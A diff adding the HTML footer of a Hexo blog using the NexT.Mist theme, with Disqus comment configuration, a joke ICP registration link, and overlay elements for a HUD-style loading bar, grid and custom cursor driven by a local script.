+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a>
+  </div><div class="beian">
+    <a href="https://icp.gov.moe/?keyword=20264433" target="_blank" rel="noopener noreferrer">萌ICP备20264433号</a>
+</div>
+
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"blog-3yiidetljv","count":false,"i18n":{"disqus":"disqus"}}</script>
+<script src="/js/third-party/comments/disqus.js" defer></script>
+<!-- HUD overlay nodes; behavior lives in /js/hud.js. -->
+<div id="pjax-load-bar" aria-hidden="true"></div>
+<div id="pjax-status" class="hud-visually-hidden" role="status" aria-live="polite" aria-atomic="true"></div>
+
+<div class="hud-grid" aria-hidden="true"></div>
+
+<div
+  class="hud-title-projection"
+  id="bg-title-projection"
+  aria-hidden="true"
+  style="display: none"
+></div>
+
+<div id="cursor-container" aria-hidden="true">
+  <div id="cursor-outer"></div>
+  <div id="cursor-dot"></div>
+  <div id="cursor-effect"></div>
+</div>
+
+<script src="/js/hud.js" defer></script>
+
+</body>
+</html>
